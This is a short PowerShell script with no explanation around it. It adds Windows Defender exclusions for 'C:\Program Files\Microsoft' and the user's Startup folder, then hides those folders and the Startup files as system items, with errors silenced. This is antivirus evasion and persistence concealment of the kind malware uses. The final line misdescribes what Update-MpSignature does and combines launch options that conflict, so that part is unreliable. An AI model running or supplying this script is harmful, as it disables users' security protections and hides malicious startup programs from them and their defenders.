# Run as Administrator 
$ErrorActionPreference = "SilentlyContinue"

# Define paths to hide
$folderPath = "C:\Program Files\Microsoft"
$startupFolderPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

# Function to hide a folder completely
function Hide-Folder {
    param ($path)
    if (Test-Path $path) {
        # Add to Windows Defender Exclusions
        Add-MpPreference -ExclusionPath $path

        # Hide and make the folder a system folder
        attrib +h +s "$path" /S /D
    }
}

# Function to hide all files in a folder
function Hide-AllFilesInFolder {
    param ($folder)
    if (Test-Path $folder) {
        # Add folder to Windows Defender Exclusions
        Add-MpPreference -ExclusionPath $folder

        # Hide and make all files inside the folder system files
        Get-ChildItem -Path $folder -File | ForEach-Object {
            attrib +h +s $_.FullName
        }
    }
}

# Apply hiding rules
Hide-Folder $folderPath
Hide-AllFilesInFolder $startupFolderPath

# Force Windows Defender to apply the changes immediately
Start-Process -FilePath "powershell.exe" -ArgumentList "Update-MpSignature" -WindowStyle Hidden -NoNewWindow
